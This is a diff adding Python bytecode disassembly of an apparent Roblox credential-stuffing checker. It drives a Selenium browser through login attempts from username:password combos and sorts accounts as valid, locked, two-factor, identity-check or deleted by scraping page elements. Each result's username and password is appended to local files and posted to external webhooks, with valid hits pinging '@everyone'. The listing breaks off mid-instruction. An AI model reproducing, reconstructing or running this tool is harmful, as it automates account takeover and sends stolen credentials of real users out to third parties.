+                2646    RERAISE                         1
+                2648    PUSH_EXC_INFO
+                2650    POP_TOP
+                2652    LOAD_GLOBAL                     65: NULL + print
+                2662    LOAD_CONST                      17: '[ERROR] Unable to load username password combo'
+                2664    CALL                            1
+                2672    POP_TOP
+                2674    POP_EXCEPT
+                2676    JUMP_BACKWARD                   746 (to 1188)
+                2680    COPY                            3
+                2682    POP_EXCEPT
+                2684    RERAISE                         1
+                2686    PUSH_EXC_INFO
+                2688    POP_TOP
+                2690    POP_EXCEPT
+                2692    JUMP_BACKWARD                   554 (to 1588)
+                2696    COPY                            3
+                2698    POP_EXCEPT
+                2700    RERAISE                         1
+                2702    PUSH_EXC_INFO
+                2704    POP_TOP
+                2706    NOP
+                2708    LOAD_FAST                       8: driver
+                2710    LOAD_ATTR                       69 <INVALID>
+                2730    LOAD_GLOBAL                     70: By
+                2740    LOAD_ATTR                       72 <INVALID>
+                2760    LOAD_CONST                      21: '//*[@id="cookie-banner-wrapper"]/div[1]/div[2]/div/div/button[2]'
+                2762    CALL                            2
+                2770    LOAD_ATTR                       79 <INVALID>
+                2790    CALL                            0
+                2798    POP_TOP
+                2800    LOAD_GLOBAL                     80: testmode
+                2810    LOAD_CONST                      12: True
+                2812    COMPARE_OP                      40 (==)
+                2816    POP_JUMP_IF_FALSE               11 (to 2840)
+                2818    LOAD_GLOBAL                     65: NULL + print
+                2828    LOAD_CONST                      22: '[-] Accepted Cookies'
+                2830    CALL                            1
+                2838    POP_TOP
+                2840    JUMP_FORWARD                    7 (to 2856)
+                2842    PUSH_EXC_INFO
+                2844    POP_TOP
+                2846    POP_EXCEPT
+                2848    JUMP_FORWARD                    3 (to 2856)
+                2850    COPY                            3
+                2852    POP_EXCEPT
+                2854    RERAISE                         1
+                2856    LOAD_GLOBAL                     80: testmode
+                2866    LOAD_CONST                      12: True
+                2868    COMPARE_OP                      40 (==)
+                2872    POP_JUMP_IF_FALSE               11 (to 2896)
+                2874    LOAD_GLOBAL                     65: NULL + print
+                2884    LOAD_CONST                      24: '[NO LOGIN]: Logging into account has failed'
+                2886    CALL                            1
+                2894    POP_TOP
+                2896    LOAD_FAST                       8: driver
+                2898    LOAD_ATTR                       83 <INVALID>
+                2918    CALL                            0
+                2926    POP_TOP
+                2928    LOAD_FAST                       8: driver
+                2930    LOAD_ATTR                       67 <INVALID>
+                2950    LOAD_CONST                      18: 'https://roblox.com/login'
+                2952    CALL                            1
+                2960    POP_TOP
+                2962    POP_EXCEPT
+                2964    JUMP_FORWARD                    3 (to 2972)
+                2966    COPY                            3
+                2968    POP_EXCEPT
+                2970    RERAISE                         1
+                2972    JUMP_BACKWARD                   874 (to 1228)
+                2976    PUSH_EXC_INFO
+                2978    WITH_EXCEPT_START
+                2980    POP_JUMP_IF_TRUE                1 (to 2984)
+                2982    RERAISE                         2
+                2984    POP_TOP
+                2986    POP_EXCEPT
+                2988    POP_TOP
+                2990    POP_TOP
+                2992    JUMP_BACKWARD                   253 (to 2488)
+                2994    COPY                            3
+                2996    POP_EXCEPT
+                2998    RERAISE                         1
+                3000    PUSH_EXC_INFO
+                3002    POP_TOP
+                3004    LOAD_GLOBAL                     80: testmode
+                3014    LOAD_CONST                      12: True
+                3016    COMPARE_OP                      40 (==)
+                3020    POP_JUMP_IF_FALSE               11 (to 3044)
+                3022    LOAD_GLOBAL                     65: NULL + print
+                3032    LOAD_CONST                      36: '[INVALID COMBO]: Unable to detect login reason frame'
+                3034    CALL                            1
+                3042    POP_TOP
+                3044    POP_EXCEPT
+                3046    JUMP_FORWARD                    3 (to 3054)
+                3048    COPY                            3
+                3050    POP_EXCEPT
+                3052    RERAISE                         1
+                3054    NOP
+                3056    LOAD_FAST                       8: driver
+                3058    LOAD_ATTR                       69 <INVALID>
+                3078    LOAD_GLOBAL                     70: By
+                3088    LOAD_ATTR                       72 <INVALID>
+                3108    LOAD_CONST                      37: '//*[@id="container-main"]/div[2]/div/h1'
+                3110    CALL                            2
+                3118    LOAD_ATTR                       86 <INVALID>
+                3138    STORE_FAST                      17: lockedaccountmessage
+                3140    LOAD_FAST                       17: lockedaccountmessage
+                3142    LOAD_CONST                      38: 'Security Notification'
+                3144    COMPARE_OP                      40 (==)
+                3148    POP_JUMP_IF_FALSE               184 (to 3518)
+                3150    LOAD_GLOBAL                     65: NULL + print
+                3160    LOAD_CONST                      39: '[LOCKED ACCOUNT]: Username - '
+                3162    LOAD_FAST                       10: username
+                3164    FORMAT_VALUE                    0
+                3166    LOAD_CONST                      30: ' Password - '
+                3168    LOAD_FAST                       11: password
+                3170    FORMAT_VALUE                    0
+                3172    LOAD_CONST                      31: ' Reason - '
+                3174    LOAD_FAST                       17: lockedaccountmessage
+                3176    FORMAT_VALUE                    0
+                3178    BUILD_STRING                    6
+                3180    CALL                            1
+                3188    POP_TOP
+                3190    LOAD_CONST                      12: True
+                3192    STORE_FAST                      12: endloop
+                3194    LOAD_GLOBAL                     29: NULL + open
+                3204    LOAD_CONST                      40: 'accounts/locked.txt'
+                3206    LOAD_CONST                      34: 'a'
+                3208    CALL                            2
+                3216    BEFORE_WITH
+                3218    STORE_FAST                      16: file
+                3220    LOAD_FAST                       16: file
+                3222    LOAD_ATTR                       91 <INVALID>
+                3242    LOAD_FAST                       10: username
+                3244    FORMAT_VALUE                    0
+                3246    LOAD_CONST                      16: ':'
+                3248    LOAD_FAST                       11: password
+                3250    FORMAT_VALUE                    0
+                3252    LOAD_CONST                      35: '\n'
+                3254    BUILD_STRING                    4
+                3256    CALL                            1
+                3264    POP_TOP
+                3266    LOAD_CONST                      0: None
+                3268    LOAD_CONST                      0: None
+                3270    LOAD_CONST                      0: None
+                3272    CALL                            2
+                3280    POP_TOP
+                3282    JUMP_FORWARD                    12 (to 3308)
+                3284    PUSH_EXC_INFO
+                3286    WITH_EXCEPT_START
+                3288    POP_JUMP_IF_TRUE                1 (to 3292)
+                3290    RERAISE                         2
+                3292    POP_TOP
+                3294    POP_EXCEPT
+                3296    POP_TOP
+                3298    POP_TOP
+                3300    JUMP_FORWARD                    3 (to 3308)
+                3302    COPY                            3
+                3304    POP_EXCEPT
+                3306    RERAISE                         1
+                3308    LOAD_GLOBAL                     95: NULL + requests
+                3318    LOAD_ATTR                       96 <INVALID>
+                3338    LOAD_GLOBAL                     98: webhooklock
+                3348    LOAD_CONST                      41: 'content'
+                3350    LOAD_CONST                      42: '[LOCKED] - USERNAME: '
+                3352    LOAD_FAST                       10: username
+                3354    FORMAT_VALUE                    0
+                3356    LOAD_CONST                      43: ' - PASSWORD: '
+                3358    LOAD_FAST                       11: password
+                3360    FORMAT_VALUE                    0
+                3362    BUILD_STRING                    4
+                3364    BUILD_MAP                       1
+                3366    KW_NAMES                        44: ('json',)
+                3368    CALL                            2
+                3376    POP_TOP
+                3378    LOAD_GLOBAL                     101: NULL + removeallcombos
+                3388    LOAD_FAST                       10: username
+                3390    CALL                            1
+                3398    POP_TOP
+                3400    LOAD_GLOBAL                     29: NULL + open
+                3410    LOAD_CONST                      33: 'data.txt'
+                3412    LOAD_CONST                      34: 'a'
+                3414    CALL                            2
+                3422    BEFORE_WITH
+                3424    STORE_FAST                      16: file
+                3426    LOAD_FAST                       16: file
+                3428    LOAD_ATTR                       91 <INVALID>
+                3448    LOAD_FAST                       10: username
+                3450    FORMAT_VALUE                    0
+                3452    LOAD_CONST                      16: ':'
+                3454    LOAD_FAST                       11: password
+                3456    FORMAT_VALUE                    0
+                3458    LOAD_CONST                      35: '\n'
+                3460    BUILD_STRING                    4
+                3462    CALL                            1
+                3470    POP_TOP
+                3472    LOAD_CONST                      0: None
+                3474    LOAD_CONST                      0: None
+                3476    LOAD_CONST                      0: None
+                3478    CALL                            2
+                3486    POP_TOP
+                3488    JUMP_FORWARD                    12 (to 3514)
+                3490    PUSH_EXC_INFO
+                3492    WITH_EXCEPT_START
+                3494    POP_JUMP_IF_TRUE                1 (to 3498)
+                3496    RERAISE                         2
+                3498    POP_TOP
+                3500    POP_EXCEPT
+                3502    POP_TOP
+                3504    POP_TOP
+                3506    JUMP_FORWARD                    3 (to 3514)
+                3508    COPY                            3
+                3510    POP_EXCEPT
+                3512    RERAISE                         1
+                3514    JUMP_BACKWARD                   503 (to 2512)
+                3518    JUMP_FORWARD                    27 (to 3574)
+                3520    PUSH_EXC_INFO
+                3522    POP_TOP
+                3524    LOAD_GLOBAL                     80: testmode
+                3534    LOAD_CONST                      12: True
+                3536    COMPARE_OP                      40 (==)
+                3540    POP_JUMP_IF_FALSE               11 (to 3564)
+                3542    LOAD_GLOBAL                     65: NULL + print
+                3552    LOAD_CONST                      45: '[INVALID COMBO]: Unable to detect locked account frame'
+                3554    CALL                            1
+                3562    POP_TOP
+                3564    POP_EXCEPT
+                3566    JUMP_FORWARD                    3 (to 3574)
+                3568    COPY                            3
+                3570    POP_EXCEPT
+                3572    RERAISE                         1
+                3574    NOP
+                3576    LOAD_FAST                       8: driver
+                3578    LOAD_ATTR                       69 <INVALID>
+                3598    LOAD_GLOBAL                     70: By
+                3608    LOAD_ATTR                       72 <INVALID>
+                3628    LOAD_CONST                      46: '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[1]/h4'
+                3630    CALL                            2
+                3638    LOAD_ATTR                       86 <INVALID>
+                3658    STORE_FAST                      18: emailframe
+                3660    LOAD_FAST                       18: emailframe
+                3662    LOAD_CONST                      47: 'Select Account to Log In'
+                3664    COMPARE_OP                      40 (==)
+                3668    POP_JUMP_IF_FALSE               185 (to 4040)
+                3670    LOAD_GLOBAL                     65: NULL + print
+                3680    LOAD_CONST                      48: '[LOGGED IN EMAIL]: Email - '
+                3682    LOAD_FAST                       10: username
+                3684    FORMAT_VALUE                    0
+                3686    LOAD_CONST                      30: ' Password - '
+                3688    LOAD_FAST                       11: password
+                3690    FORMAT_VALUE                    0
+                3692    LOAD_CONST                      31: ' Reason - '
+                3694    LOAD_FAST                       18: emailframe
+                3696    FORMAT_VALUE                    0
+                3698    BUILD_STRING                    6
+                3700    CALL                            1
+                3708    POP_TOP
+                3710    LOAD_CONST                      12: True
+                3712    STORE_FAST                      12: endloop
+                3714    LOAD_GLOBAL                     29: NULL + open
+                3724    LOAD_CONST                      49: 'accounts/valid.txt'
+                3726    LOAD_CONST                      34: 'a'
+                3728    CALL                            2
+                3736    BEFORE_WITH
+                3738    STORE_FAST                      16: file
+                3740    LOAD_FAST                       16: file
+                3742    LOAD_ATTR                       91 <INVALID>
+                3762    LOAD_FAST                       10: username
+                3764    FORMAT_VALUE                    0
+                3766    LOAD_CONST                      16: ':'
+                3768    LOAD_FAST                       11: password
+                3770    FORMAT_VALUE                    0
+                3772    LOAD_CONST                      35: '\n'
+                3774    BUILD_STRING                    4
+                3776    CALL                            1
+                3784    POP_TOP
+                3786    LOAD_CONST                      0: None
+                3788    LOAD_CONST                      0: None
+                3790    LOAD_CONST                      0: None
+                3792    CALL                            2
+                3800    POP_TOP
+                3802    JUMP_FORWARD                    12 (to 3828)
+                3804    PUSH_EXC_INFO
+                3806    WITH_EXCEPT_START
+                3808    POP_JUMP_IF_TRUE                1 (to 3812)
+                3810    RERAISE                         2
+                3812    POP_TOP
+                3814    POP_EXCEPT
+                3816    POP_TOP
+                3818    POP_TOP
+                3820    JUMP_FORWARD                    3 (to 3828)
+                3822    COPY                            3
+                3824    POP_EXCEPT
+                3826    RERAISE                         1
+                3828    LOAD_GLOBAL                     95: NULL + requests
+                3838    LOAD_ATTR                       96 <INVALID>
+                3858    LOAD_GLOBAL                     102: validwebhook
+                3868    LOAD_CONST                      41: 'content'
+                3870    LOAD_CONST                      50: '[VALID] - USERNAME: '
+                3872    LOAD_FAST                       10: username
+                3874    FORMAT_VALUE                    0
+                3876    LOAD_CONST                      43: ' - PASSWORD: '
+                3878    LOAD_FAST                       11: password
+                3880    FORMAT_VALUE                    0
+                3882    LOAD_CONST                      51: ' @everyone'
+                3884    BUILD_STRING                    5
+                3886    BUILD_MAP                       1
+                3888    KW_NAMES                        44: ('json',)
+                3890    CALL                            2
+                3898    POP_TOP
+                3900    LOAD_GLOBAL                     101: NULL + removeallcombos
+                3910    LOAD_FAST                       10: username
+                3912    CALL                            1
+                3920    POP_TOP
+                3922    LOAD_GLOBAL                     29: NULL + open
+                3932    LOAD_CONST                      33: 'data.txt'
+                3934    LOAD_CONST                      34: 'a'
+                3936    CALL                            2
+                3944    BEFORE_WITH
+                3946    STORE_FAST                      16: file
+                3948    LOAD_FAST                       16: file
+                3950    LOAD_ATTR                       91 <INVALID>
+                3970    LOAD_FAST                       10: username
+                3972    FORMAT_VALUE                    0
+                3974    LOAD_CONST                      16: ':'
+                3976    LOAD_FAST                       11: password
+                3978    FORMAT_VALUE                    0
+                3980    LOAD_CONST                      35: '\n'
+                3982    BUILD_STRING                    4
+                3984    CALL                            1
+                3992    POP_TOP
+                3994    LOAD_CONST                      0: None
+                3996    LOAD_CONST                      0: None
+                3998    LOAD_CONST                      0: None
+                4000    CALL                            2
+                4008    POP_TOP
+                4010    JUMP_FORWARD                    12 (to 4036)
+                4012    PUSH_EXC_INFO
+                4014    WITH_EXCEPT_START
+                4016    POP_JUMP_IF_TRUE                1 (to 4020)
+                4018    RERAISE                         2
+                4020    POP_TOP
+                4022    POP_EXCEPT
+                4024    POP_TOP
+                4026    POP_TOP
+                4028    JUMP_FORWARD                    3 (to 4036)
+                4030    COPY                            3
+                4032    POP_EXCEPT
+                4034    RERAISE                         1
+                4036    JUMP_BACKWARD                   764 (to 2512)
+                4040    JUMP_FORWARD                    27 (to 4096)
+                4042    PUSH_EXC_INFO
+                4044    POP_TOP
+                4046    LOAD_GLOBAL                     80: testmode
+                4056    LOAD_CONST                      12: True
+                4058    COMPARE_OP                      40 (==)
+                4062    POP_JUMP_IF_FALSE               11 (to 4086)
+                4064    LOAD_GLOBAL                     65: NULL + print
+                4074    LOAD_CONST                      52: '[INVALID EMAIL FRAME]: Unable to detect email login frame'
+                4076    CALL                            1
+                4084    POP_TOP
+                4086    POP_EXCEPT
+                4088    JUMP_FORWARD                    3 (to 4096)
+                4090    COPY                            3
+                4092    POP_EXCEPT
+                4094    RERAISE                         1
+                4096    NOP
+                4098    LOAD_CONST                      3: False
+                4100    STORE_FAST                      19: twofactorpass
+                4102    NOP
+                4104    LOAD_FAST                       8: driver
+                4106    LOAD_ATTR                       69 <INVALID>
+                4126    LOAD_GLOBAL                     70: By
+                4136    LOAD_ATTR                       72 <INVALID>
+                4156    LOAD_CONST                      53: '//*[@id="rbx-body"]/div[19]/div[2]/div/div/div[2]/p[1]'
+                4158    CALL                            2
+                4166    LOAD_ATTR                       86 <INVALID>
+                4186    STORE_FAST                      20: twostepframe
+                4188    LOAD_CONST                      12: True
+                4190    STORE_FAST                      19: twofactorpass
+                4192    JUMP_FORWARD                    27 (to 4248)
+                4194    PUSH_EXC_INFO
+                4196    POP_TOP
+                4198    LOAD_GLOBAL                     80: testmode
+                4208    LOAD_CONST                      12: True
+                4210    COMPARE_OP                      40 (==)
+                4214    POP_JUMP_IF_FALSE               11 (to 4238)
+                4216    LOAD_GLOBAL                     65: NULL + print
+                4226    LOAD_CONST                      54: '[2FA]: Check 1 Fail'
+                4228    CALL                            1
+                4236    POP_TOP
+                4238    POP_EXCEPT
+                4240    JUMP_FORWARD                    3 (to 4248)
+                4242    COPY                            3
+                4244    POP_EXCEPT
+                4246    RERAISE                         1
+                4248    NOP
+                4250    LOAD_FAST                       8: driver
+                4252    LOAD_ATTR                       69 <INVALID>
+                4272    LOAD_GLOBAL                     70: By
+                4282    LOAD_ATTR                       72 <INVALID>
+                4302    LOAD_CONST                      55: '//*[@id="rbx-body"]/div[18]/div[2]/div/div/div[2]/p[1]'
+                4304    CALL                            2
+                4312    LOAD_ATTR                       86 <INVALID>
+                4332    STORE_FAST                      20: twostepframe
+                4334    LOAD_CONST                      12: True
+                4336    STORE_FAST                      19: twofactorpass
+                4338    JUMP_FORWARD                    27 (to 4394)
+                4340    PUSH_EXC_INFO
+                4342    POP_TOP
+                4344    LOAD_GLOBAL                     80: testmode
+                4354    LOAD_CONST                      12: True
+                4356    COMPARE_OP                      40 (==)
+                4360    POP_JUMP_IF_FALSE               11 (to 4384)
+                4362    LOAD_GLOBAL                     65: NULL + print
+                4372    LOAD_CONST                      56: '[2FA]: Check 2 Fail'
+                4374    CALL                            1
+                4382    POP_TOP
+                4384    POP_EXCEPT
+                4386    JUMP_FORWARD                    3 (to 4394)
+                4388    COPY                            3
+                4390    POP_EXCEPT
+                4392    RERAISE                         1
+                4394    LOAD_FAST                       19: twofactorpass
+                4396    LOAD_CONST                      12: True
+                4398    COMPARE_OP                      40 (==)
+                4402    POP_JUMP_IF_FALSE               184 (to 4772)
+                4404    LOAD_CONST                      12: True
+                4406    STORE_FAST                      12: endloop
+                4408    LOAD_GLOBAL                     29: NULL + open
+                4418    LOAD_CONST                      57: 'accounts/twofactorauth.txt'
+                4420    LOAD_CONST                      34: 'a'
+                4422    CALL                            2
+                4430    BEFORE_WITH
+                4432    STORE_FAST                      16: file
+                4434    LOAD_FAST                       16: file
+                4436    LOAD_ATTR                       91 <INVALID>
+                4456    LOAD_FAST                       10: username
+                4458    FORMAT_VALUE                    0
+                4460    LOAD_CONST                      16: ':'
+                4462    LOAD_FAST                       11: password
+                4464    FORMAT_VALUE                    0
+                4466    LOAD_CONST                      35: '\n'
+                4468    BUILD_STRING                    4
+                4470    CALL                            1
+                4478    POP_TOP
+                4480    LOAD_CONST                      0: None
+                4482    LOAD_CONST                      0: None
+                4484    LOAD_CONST                      0: None
+                4486    CALL                            2
+                4494    POP_TOP
+                4496    JUMP_FORWARD                    12 (to 4522)
+                4498    PUSH_EXC_INFO
+                4500    WITH_EXCEPT_START
+                4502    POP_JUMP_IF_TRUE                1 (to 4506)
+                4504    RERAISE                         2
+                4506    POP_TOP
+                4508    POP_EXCEPT
+                4510    POP_TOP
+                4512    POP_TOP
+                4514    JUMP_FORWARD                    3 (to 4522)
+                4516    COPY                            3
+                4518    POP_EXCEPT
+                4520    RERAISE                         1
+                4522    LOAD_GLOBAL                     65: NULL + print
+                4532    LOAD_CONST                      58: '[2FA]: Username - '
+                4534    LOAD_FAST                       10: username
+                4536    FORMAT_VALUE                    0
+                4538    LOAD_CONST                      30: ' Password - '
+                4540    LOAD_FAST                       11: password
+                4542    FORMAT_VALUE                    0
+                4544    LOAD_CONST                      31: ' Reason - '
+                4546    LOAD_FAST_CHECK                 20: twostepframe
+                4548    FORMAT_VALUE                    0
+                4550    BUILD_STRING                    6
+                4552    CALL                            1
+                4560    POP_TOP
+                4562    LOAD_GLOBAL                     29: NULL + open
+                4572    LOAD_CONST                      33: 'data.txt'
+                4574    LOAD_CONST                      34: 'a'
+                4576    CALL                            2
+                4584    BEFORE_WITH
+                4586    STORE_FAST                      16: file
+                4588    LOAD_FAST                       16: file
+                4590    LOAD_ATTR                       91 <INVALID>
+                4610    LOAD_FAST                       10: username
+                4612    FORMAT_VALUE                    0
+                4614    LOAD_CONST                      16: ':'
+                4616    LOAD_FAST                       11: password
+                4618    FORMAT_VALUE                    0
+                4620    LOAD_CONST                      35: '\n'
+                4622    BUILD_STRING                    4
+                4624    CALL                            1
+                4632    POP_TOP
+                4634    LOAD_CONST                      0: None
+                4636    LOAD_CONST                      0: None
+                4638    LOAD_CONST                      0: None
+                4640    CALL                            2
+                4648    POP_TOP
+                4650    JUMP_FORWARD                    12 (to 4676)
+                4652    PUSH_EXC_INFO
+                4654    WITH_EXCEPT_START
+                4656    POP_JUMP_IF_TRUE                1 (to 4660)
+                4658    RERAISE                         2
+                4660    POP_TOP
+                4662    POP_EXCEPT
+                4664    POP_TOP
+                4666    POP_TOP
+                4668    JUMP_FORWARD                    3 (to 4676)
+                4670    COPY                            3
+                4672    POP_EXCEPT
+                4674    RERAISE                         1
+                4676    LOAD_GLOBAL                     95: NULL + requests
+                4686    LOAD_ATTR                       96 <INVALID>
+                4706    LOAD_GLOBAL                     104: webhook2fa
+                4716    LOAD_CONST                      41: 'content'
+                4718    LOAD_CONST                      59: '[2FA] - USERNAME: '
+                4720    LOAD_FAST                       10: username
+                4722    FORMAT_VALUE                    0
+                4724    LOAD_CONST                      43: ' - PASSWORD: '
+                4726    LOAD_FAST                       11: password
+                4728    FORMAT_VALUE                    0
+                4730    BUILD_STRING                    4
+                4732    BUILD_MAP                       1
+                4734    KW_NAMES                        44: ('json',)
+                4736    CALL                            2
+                4744    POP_TOP
+                4746    LOAD_GLOBAL                     101: NULL + removeallcombos
+                4756    LOAD_FAST                       10: username
+                4758    CALL                            1
+                4766    POP_TOP
+                4768    JUMP_BACKWARD                   1130 (to 2512)
+                4772    JUMP_FORWARD                    27 (to 4828)
+                4774    PUSH_EXC_INFO
+                4776    POP_TOP
+                4778    LOAD_GLOBAL                     80: testmode
+                4788    LOAD_CONST                      12: True
+                4790    COMPARE_OP                      40 (==)
+                4794    POP_JUMP_IF_FALSE               11 (to 4818)
+                4796    LOAD_GLOBAL                     65: NULL + print
+                4806    LOAD_CONST                      60: '[INVALID 2FA FRAME]: Unable to detect 2fa frame'
+                4808    CALL                            1
+                4816    POP_TOP
+                4818    POP_EXCEPT
+                4820    JUMP_FORWARD                    3 (to 4828)
+                4822    COPY                            3
+                4824    POP_EXCEPT
+                4826    RERAISE                         1
+                4828    NOP
+                4830    LOAD_FAST                       8: driver
+                4832    LOAD_ATTR                       69 <INVALID>
+                4852    LOAD_GLOBAL                     70: By
+                4862    LOAD_ATTR                       72 <INVALID>
+                4882    LOAD_CONST                      61: '//*[@id="rbx-body"]/div[17]/div[2]/div/div/div[1]/h4'
+                4884    CALL                            2
+                4892    LOAD_ATTR                       86 <INVALID>
+                4912    STORE_FAST                      21: idenityframe
+                4914    LOAD_FAST                       21: idenityframe
+                4916    LOAD_CONST                      62: 'Please Confirm Your Identity'
+                4918    COMPARE_OP                      40 (==)
+                4922    POP_JUMP_IF_FALSE               184 (to 5292)
+                4924    LOAD_CONST                      12: True
+                4926    STORE_FAST                      12: endloop
+                4928    LOAD_GLOBAL                     65: NULL + print
+                4938    LOAD_CONST                      63: '[GOT IDENITY FRAME]: Username - '
+                4940    LOAD_FAST                       10: username
+                4942    FORMAT_VALUE                    0
+                4944    LOAD_CONST                      30: ' Password - '
+                4946    LOAD_FAST                       11: password
+                4948    FORMAT_VALUE                    0
+                4950    LOAD_CONST                      31: ' Reason - '
+                4952    LOAD_FAST                       21: idenityframe
+                4954    FORMAT_VALUE                    0
+                4956    BUILD_STRING                    6
+                4958    CALL                            1
+                4966    POP_TOP
+                4968    LOAD_GLOBAL                     29: NULL + open
+                4978    LOAD_CONST                      64: 'accounts/verifyidentity.txt'
+                4980    LOAD_CONST                      34: 'a'
+                4982    CALL                            2
+                4990    BEFORE_WITH
+                4992    STORE_FAST                      16: file
+                4994    LOAD_FAST                       16: file
+                4996    LOAD_ATTR                       91 <INVALID>
+                5016    LOAD_FAST                       10: username
+                5018    FORMAT_VALUE                    0
+                5020    LOAD_CONST                      16: ':'
+                5022    LOAD_FAST                       11: password
+                5024    FORMAT_VALUE                    0
+                5026    LOAD_CONST                      35: '\n'
+                5028    BUILD_STRING                    4
+                5030    CALL                            1
+                5038    POP_TOP
+                5040    LOAD_CONST                      0: None
+                5042    LOAD_CONST                      0: None
+                5044    LOAD_CONST                      0: None
+                5046    CALL                            2
+                5054    POP_TOP
+                5056    JUMP_FORWARD                    12 (to 5082)
+                5058    PUSH_EXC_INFO
+                5060    WITH_EXCEPT_START
+                5062    POP_JUMP_IF_TRUE                1 (to 5066)
+                5064    RERAISE                         2
+                5066    POP_TOP
+                5068    POP_EXCEPT
+                5070    POP_TOP
+                5072    POP_TOP
+                5074    JUMP_FORWARD                    3 (to 5082)
+                5076    COPY                            3
+                5078    POP_EXCEPT
+                5080    RERAISE                         1
+                5082    LOAD_GLOBAL                     29: NULL + open
+                5092    LOAD_CONST                      33: 'data.txt'
+                5094    LOAD_CONST                      34: 'a'
+                5096    CALL                            2
+                5104    BEFORE_WITH
+                5106    STORE_FAST                      16: file
+                5108    LOAD_FAST                       16: file
+                5110    LOAD_ATTR                       91 <INVALID>
+                5130    LOAD_FAST                       10: username
+                5132    FORMAT_VALUE                    0
+                5134    LOAD_CONST                      16: ':'
+                5136    LOAD_FAST                       11: password
+                5138    FORMAT_VALUE                    0
+                5140    LOAD_CONST                      35: '\n'
+                5142    BUILD_STRING                    4
+                5144    CALL                            1
+                5152    POP_TOP
+                5154    LOAD_CONST                      0: None
+                5156    LOAD_CONST                      0: None
+                5158    LOAD_CONST                      0: None
+                5160    CALL                            2
+                5168    POP_TOP
+                5170    JUMP_FORWARD                    12 (to 5196)
+                5172    PUSH_EXC_INFO
+                5174    WITH_EXCEPT_START
+                5176    POP_JUMP_IF_TRUE                1 (to 5180)
+                5178    RERAISE                         2
+                5180    POP_TOP
+                5182    POP_EXCEPT
+                5184    POP_TOP
+                5186    POP_TOP
+                5188    JUMP_FORWARD                    3 (to 5196)
+                5190    COPY                            3
+                5192    POP_EXCEPT
+                5194    RERAISE                         1
+                5196    LOAD_GLOBAL                     95: NULL + requests
+                5206    LOAD_ATTR                       96 <INVALID>
+                5226    LOAD_GLOBAL                     106: webhookconfirm
+                5236    LOAD_CONST                      41: 'content'
+                5238    LOAD_CONST                      65: '[PLEASE CONFIRM] - USERNAME: '
+                5240    LOAD_FAST                       10: username
+                5242    FORMAT_VALUE                    0
+                5244    LOAD_CONST                      43: ' - PASSWORD: '
+                5246    LOAD_FAST                       11: password
+                5248    FORMAT_VALUE                    0
+                5250    BUILD_STRING                    4
+                5252    BUILD_MAP                       1
+                5254    KW_NAMES                        44: ('json',)
+                5256    CALL                            2
+                5264    POP_TOP
+                5266    LOAD_GLOBAL                     101: NULL + removeallcombos
+                5276    LOAD_FAST                       10: username
+                5278    CALL                            1
+                5286    POP_TOP
+                5288    JUMP_BACKWARD                   1390 (to 2512)
+                5292    JUMP_FORWARD                    27 (to 5348)
+                5294    PUSH_EXC_INFO
+                5296    POP_TOP
+                5298    LOAD_GLOBAL                     80: testmode
+                5308    LOAD_CONST                      12: True
+                5310    COMPARE_OP                      40 (==)
+                5314    POP_JUMP_IF_FALSE               11 (to 5338)
+                5316    LOAD_GLOBAL                     65: NULL + print
+                5326    LOAD_CONST                      66: '[INVALID IDENITY FRAME]: Unable to detect email login frame'
+                5328    CALL                            1
+                5336    POP_TOP
+                5338    POP_EXCEPT
+                5340    JUMP_FORWARD                    3 (to 5348)
+                5342    COPY                            3
+                5344    POP_EXCEPT
+                5346    RERAISE                         1
+                5348    NOP
+                5350    LOAD_FAST                       8: driver
+                5352    LOAD_ATTR                       69 <INVALID>
+                5372    LOAD_GLOBAL                     70: By
+                5382    LOAD_ATTR                       72 <INVALID>
+                5402    LOAD_CONST                      67: '//*[@id="container-main"]/div[2]/div/div/div[1]/h3'
+                5404    CALL                            2
+                5412    LOAD_ATTR                       86 <INVALID>
+                5432    STORE_FAST                      22: termedframe
+                5434    LOAD_FAST                       22: termedframe
+                5436    LOAD_CONST                      68: 'Account Deleted'
+                5438    COMPARE_OP                      40 (==)
+                5442    POP_JUMP_IF_FALSE               220 (to 5884)
+                5444    LOAD_CONST                      12: True
+                5446    STORE_FAST                      12: endloop
+                5448    LOAD_GLOBAL                     65: NULL + print
+                5458    LOAD_CONST                      69: '[TERMED ACCOUNT]: Username - '
+                5460    LOAD_FAST                       10: username
+                5462    FORMAT_VALUE                    0
+                5464    LOAD_CONST                      30: ' Password - '
+                5466    LOAD_FAST                       11: password
+                5468    FORMAT_VALUE                    0
+                5470    LOAD_CONST                      31: ' Reason - '
+                5472    LOAD_FAST                       22: termedframe
+                5474    FORMAT_VALUE                    0
+                5476    BUILD_STRING                    6
+                5478    CALL                            1
+                5486    POP_TOP
+                5488    LOAD_GLOBAL                     65: NULL + print
+                5498    LOAD_CONST                      63: '[GOT IDENITY FRAME]: Username - '
+                5500    LOAD_FAST                       10: username
+                5502    FORMAT_VALUE                    0
+                5504    LOAD_CONST                      30: ' Password - '
+                5506    LOAD_FAST                       11: password
+                5508    FORMAT_VALUE                    0
+                5510    LOAD_CONST                      31: ' Reason - '
+                5512    LOAD_FAST_CHECK                 21: idenityframe
+                5514    FORMAT_VALUE                    0
+                5516    BUILD_STRING                    6
+                5518    CALL                            1
+                5526    POP_TOP
+                5528    LOAD_GLOBAL                     29: NULL + open
+                5538    LOAD_CONST                      70: 'accounts/termed.txt'
+                5540    LOAD_CONST                      34: 'a'
+                5542    CALL                            2
+                5550    BEFORE_WITH
+                5552    STORE_FAST                      16: file
+                5554    LOAD_FAST                       16: file
+                5556    LOAD_ATTR                       91 <INVALID>
+                5576    LOAD_FAST                       10: username
+                5578    FORMAT_VALUE                    0
+                5580    LOAD_CONST                      16: ':'
+                5582    LOAD_FAST                       11: password
+                5584    FORMAT_VALUE                    0
+                5586    LOAD_CONST                      35: '\n'
+                5588    BUILD_STRING                    4
+                5590    CALL                            1
+                5598    POP_TOP
+                5600    LOAD_CONST                      0: None
+                5602    LOAD_CONST                      0: None
+                5604    LOAD_CONST                      0: None
+                5606    CALL                            2
+                5614    POP_TOP
+                5616    JUMP_FORWARD                    12 (to 5642)
+                5618    PUSH_EXC_INFO
+                5620    WITH_EXCEPT_START
+                5622    POP_JUMP_IF_TRUE                1 (to 5626)
+                5624    RERAISE                         2
+                5626    POP_TOP
+                5628    POP_EXCEPT
+                5630    POP_TOP
+                5632    POP_TOP
+                5634    JUMP_FORWARD                    3 (to 5642)
+                5636    COPY                            3
+                5638    POP_EXCEPT
+                5640    RERAISE                         1
+                5642    LOAD_GLOBAL                     95: NULL + requests
+                5652    LOAD_ATTR                       96 <INVALID>
+                5672    LOAD_GLOBAL                     108: webhookterm
